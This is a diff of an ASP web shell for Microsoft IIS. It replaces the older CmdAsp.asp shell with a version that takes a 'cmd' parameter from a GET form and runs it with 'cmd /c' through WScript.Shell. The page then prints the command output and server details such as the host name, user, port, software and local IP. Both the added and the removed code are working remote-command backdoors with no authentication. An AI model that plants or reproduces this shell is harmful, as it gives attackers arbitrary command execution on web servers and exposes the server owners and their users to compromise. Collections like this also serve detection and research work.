@@ -1,55 +1,51 @@
-<%@ Language=VBScript %>
+<!--
+ASP Webshell
+Working on latest IIS 
+Referance :- 
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
+http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
+http://www.w3schools.com/asp/
+-->
+
+
 <%
-  ' --------------------o0o--------------------
-  '  File:    CmdAsp.asp
-  '  Author:  Maceo <maceo @ dogmile.com>
-  '  Release: 2000-12-01
-  '  OS:      Windows 2000, 4.0 NT
-  ' -------------------------------------------
-
-  Dim oScript
-  Dim oScriptNet
-  Dim oFileSys, oFile
-  Dim szCMD, szTempFile
-
-  On Error Resume Next
-
-  ' -- create the COM objects that we will be using -- '
-  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
-  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
-  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
-
-  ' -- check for a command that we have posted -- '
-  szCMD = Request.Form(".CMD")
-  If (szCMD <> "") Then
-
-    ' -- Use a poor man's pipe ... a temp file -- '
-    szTempFile = "C:\" & oFileSys.GetTempName( )
-    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
-    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
-
-  End If
-
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
 %>
+
+
 <HTML>
 <BODY>
-<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
-<input type=text name=".CMD" size=45 value="<%= szCMD %>">
-<input type=submit value="Run">
+<FORM action="" method="GET">
+<input type="text" name="cmd" size=45 value="<%= szCMD %>">
+<input type="submit" value="Run">
 </FORM>
 <PRE>
 <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+<%Response.Write(Request.ServerVariables("server_name"))%>
+<p>
+<b>The server's port:</b>
+<%Response.Write(Request.ServerVariables("server_port"))%>
+</p>
+<p>
+<b>The server's software:</b>
+<%Response.Write(Request.ServerVariables("server_software"))%>
+</p>
+<p>
+<b>The server's local address:</b>
+<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
+<% szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" & szCMD)
+Response.Write(thisDir)%>
+</p>
 <br>
-<%
-  If (IsObject(oFile)) Then
-    ' -- Read the output from our command and remove the temp file -- '
-    On Error Resume Next
-    Response.Write Server.HTMLEncode(oFile.ReadAll)
-    oFile.Close
-    Call oFileSys.DeleteFile(szTempFile, True)
-  End If
-%>
 </BODY>
 </HTML>
 
-<!--    http://michaeldaw.org   2006    -->
